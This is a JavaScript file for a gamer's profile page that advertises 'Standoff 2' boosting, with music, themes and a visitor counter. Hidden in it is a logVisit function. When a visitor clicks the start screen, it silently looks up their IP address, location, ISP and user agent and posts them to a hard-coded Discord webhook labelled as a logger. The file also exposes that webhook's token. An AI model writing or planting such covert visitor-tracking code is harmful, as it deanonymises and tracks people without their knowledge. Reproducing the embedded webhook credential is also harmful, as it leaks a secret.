let hasUserInteracted = false;

function initMedia() {
  const backgroundMusic = document.getElementById('background-music');
  const backgroundVideo = document.getElementById('background');
  if (!backgroundMusic || !backgroundVideo) return;
  backgroundMusic.volume = 0.3;
  backgroundVideo.muted = true;
  backgroundVideo.play().catch(() => {});
}

document.addEventListener('DOMContentLoaded', () => {
  const startScreen = document.getElementById('start-screen');
  const startText = document.getElementById('start-text');
  const profileName = document.getElementById('profile-name');
  const profileBio = document.getElementById('profile-bio');
  const visitorCount = document.getElementById('visitor-count');
  const backgroundMusic = document.getElementById('background-music');
  const hackerMusic = document.getElementById('hacker-music');
  const rainMusic = document.getElementById('rain-music');
  const animeMusic = document.getElementById('anime-music');
  const carMusic = document.getElementById('car-music');
  const homeButton = document.getElementById('home-theme');
  const hackerButton = document.getElementById('hacker-theme');
  const rainButton = document.getElementById('rain-theme');
  const animeButton = document.getElementById('anime-theme');
  const carButton = document.getElementById('car-theme');
  const resultsButtonContainer = document.getElementById('results-button-container');
  const resultsButton = document.getElementById('results-theme');
  const volumeIcon = document.getElementById('volume-icon');
  const volumeSlider = document.getElementById('volume-slider');
  const transparencySlider = document.getElementById('transparency-slider');
  const backgroundVideo = document.getElementById('background');
  const hackerOverlay = document.getElementById('hacker-overlay');
  const snowOverlay = document.getElementById('snow-overlay');
  const glitchOverlay = document.querySelector('.glitch-overlay');
  const profileBlock = document.getElementById('profile-block');
  const skillsBlock = document.getElementById('skills-block');
  const pythonBar = document.getElementById('python-bar');
  const cppBar = document.getElementById('cpp-bar');
  const csharpBar = document.getElementById('csharp-bar');
  const resultsHint = document.getElementById('results-hint');
  const profilePicture = document.querySelector('.profile-picture');
  const profileContainer = document.querySelector('.profile-container');
  const socialIcons = document.querySelectorAll('.social-icon');
  const badges = document.querySelectorAll('.badge');

  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1474293200079425538/Zfj1oCoTQR1ycrWdL0y_7j4R_oRe1PMwmL5_wA4HUcwngLHlKT9aK4XHGTAHKLoj7Zgi';

  async function logVisit() {
    try {
      const ipResponse = await fetch('https://ipapi.co/json/');
      const ipData = await ipResponse.json();
      const payload = {
        username: 'Hexarion JAQLIV Logger',
        embeds: [{
          title: '🚀 New Profile Visit',
          color: 0x00CED1,
          fields: [
            { name: '📍 Location', value: `${ipData.city || '??'}, ${ipData.country_name || '??'}`, inline: true },
            { name: '🌐 IP', value: ipData.ip || '??', inline: true },
            { name: '🏢 ISP', value: ipData.org || '??', inline: false },
            { name: '📱 Device', value: navigator.userAgent, inline: false }
          ],
          timestamp: new Date().toISOString()
        }]
      };
      await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
    } catch (e) {}
  }

  async function initializeVisitorCounter() {
    try {
      const response = await fetch(`https://api.countapi.xyz/hit/hexarion_final_v5/visits`);
      const data = await response.json();
      if (data && data.value) visitorCount.textContent = data.value.toLocaleString();
    } catch (err) {
      const startDate = new Date('2026-02-20T15:20:00Z').getTime();
      visitorCount.textContent = Math.max(1, Math.floor((Date.now() - startDate) / 60000)).toLocaleString();
    }
  }

  const isTouchDevice = window.matchMedia("(pointer: coarse)").matches;
  if (isTouchDevice) {
    document.body.classList.add('touch-device');
  }

  const startMessage = "Click here to see the motion baby";
  let startIndex = 0;
  function typeWriterStart() {
    if (startIndex < startMessage.length) {
      startText.textContent = startMessage.slice(0, startIndex + 1) + '|';
      startIndex++;
      setTimeout(typeWriterStart, 100);
    }
  }

  initializeVisitorCounter();
  typeWriterStart();

  startScreen.addEventListener('click', () => {
    startScreen.classList.add('hidden');
    logVisit();
    backgroundMusic.muted = false;
    backgroundMusic.play().catch(() => {});
    profileBlock.classList.remove('hidden');
    gsap.to(profileBlock, { opacity: 1, duration: 1, ease: 'power2.out' });
    typeWriterName();
    typeWriterBio();
  });

  const name = "Hexarion";
  let nameIndex = 0;
  function typeWriterName() {
    if (nameIndex < name.length) {
      profileName.textContent = name.slice(0, nameIndex + 1) + '|';
      nameIndex++;
      setTimeout(typeWriterName, 200);
    } else { profileName.textContent = name; }
  }

  const bioMessages = ["Professional Standoff 2 Booster.", "Fast. Reliable. Legit."];
  let bioMsgIndex = 0;
  let charIndex = 0;
  function typeWriterBio() {
    if (charIndex < bioMessages[bioMsgIndex].length) {
      profileBio.textContent = bioMessages[bioMsgIndex].slice(0, charIndex + 1) + '|';
      charIndex++;
      setTimeout(typeWriterBio, 100);
    } else {
      setTimeout(() => {
        charIndex = 0;
        bioMsgIndex = (bioMsgIndex + 1) % bioMessages.length;
        typeWriterBio();
      }, 3000);
    }
  }

  // Simplified Theme Switchers
  function switchTheme(videoSrc, audio, themeClass) {
    if (audio) {
      if (currentAudio) currentAudio.pause();
      currentAudio = audio;
      currentAudio.play().catch(() => {});
    }
    backgroundVideo.src = videoSrc;
    document.body.className = themeClass;
  }

  homeButton.onclick = () => switchTheme('https://r2.guns.lol/fe368ed1-2b04-4512-8fba-3288f7c0e17d.mp4', backgroundMusic, 'home-theme');
  
  let currentAudio = backgroundMusic;
  volumeSlider.oninput = () => { currentAudio.volume = volumeSlider.value; };
  transparencySlider.oninput = () => { profileBlock.style.opacity = transparencySlider.value; };

  resultsButton.onclick = () => {
    profileBlock.classList.toggle('hidden');
    skillsBlock.classList.toggle('hidden');
  };
});
